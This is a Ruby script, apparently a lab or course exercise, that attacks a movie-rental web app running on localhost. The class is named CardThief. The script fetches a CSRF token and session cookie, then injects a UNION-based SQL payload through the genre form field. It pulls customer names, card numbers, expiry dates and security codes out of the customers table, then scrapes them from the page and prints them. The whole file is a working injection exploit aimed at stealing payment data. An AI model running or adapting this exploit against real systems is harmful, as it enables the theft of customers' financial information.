require 'socket'
require 'cgi'

class CreditCard
  attr_reader :customer_name, :card_number, :exp_month, :exp_year, :sec_code

  def initialize(parameters)
    @customer_name = parameters[:customer_name]
    @card_number = parameters[:card_number]
    @exp_month = parameters[:exp_month]
    @exp_year = parameters[:exp_year]
    @sec_code = parameters[:sec_code]
  end
end

class CardThief
  def initialize #constructor
    @@host = "localhost"
    @@port = 3000
  end

  def printCreditCardInfo()
    editedcardinfo().each_with_index do |card, n|
      puts "Card #" + n.to_s + "\n"
      puts "Customer Name:\t\t" + card.customer_name
      puts "Credit Card Number:\t" + card.card_number
      puts "Expiration date:\t" + card.exp_month + "/" + card.exp_year
      puts "3-digit security code:\t" + card.sec_code + "\n\n"
    end
  end

  def editedcardinfo() # This method returns an array of CreditCard objects
    card_info_regex = /<td><a href="\/movies\/rent\/\d+">(.*)<\/a><\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>/

    raw_card_info = fetchcardinfo()

    nice_card_info = []

    raw_card_info.scan(card_info_regex) do |c|
      card_info = {customer_name: c[0], card_number: c[1], exp_month: c[2], exp_year: c[3], sec_code: c[4]}
      nice_card_info << CreditCard.new(card_info)
    end

    return nice_card_info
  end

  def fetchcardinfo #SQL query
    sql = "' AND 1=0 UNION SELECT billing_street, name, card_number, exp_month, exp_year, security_code, billing_city
             FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='"

    token_and_cookie = gettokenandcookie() #get token and cookie
    auth_token = token_and_cookie[0]; #make variables
    session_cookie = token_and_cookie[1]; #make variables

    request_body = "authenticity_token=" + CGI::escape(auth_token) + "&" \
		   "genre=" + CGI::escape(sql) + "&" \
		   "commit=Show+Movies\r\n\r\n"

    http_request = "POST /movies/showGenre HTTP/1.1\r\n" \
			  "Host: " + @@host + ":" + @@port.to_s + "\r\n" \
			  "Connection: close\r\n" \
			  "Content-Type: application/x-www-form-urlencoded\r\n" \
			  "Content-Length: " + request_body.size.to_s + "\r\n" \
			  "Cookie: _session_id=" + session_cookie + "\r\n" \
			  "\r\n"
    http_request += request_body

    # send HTTP request and get response
    s = TCPSocket.open(@@host, @@port)
    s.puts http_request
    http_response = s.read

    return http_response
  end

  def gettokenandcookie
    auth_token_regex = /<input name="authenticity_token" type="hidden" value="(.*)" \/>/
    session_cookie_regex = /^Set-Cookie: _session_id=([a-zA-Z0-9]*);/

    # send HTTP request and get response
    s = TCPSocket.open(@@host, @@port)
    s.puts "GET /movies/selectGenre HTTP/1.1\r\n" \
				  "Connection: close\r\n" \
				  "Host: " + @@host + ":" + @@port.to_s + "\r\n" \
				  "\r\n"
    http_response = s.read

    # parse out the CSRF authenticity token and the unauthenticated session cookie
    auth_token = (http_response =~ auth_token_regex) ? $1 : nil
    session_cookie = (http_response =~ session_cookie_regex) ? $1 : nil

    return [auth_token, session_cookie]
  end
end

t = CardThief.new()
t.printCreditCardInfo()
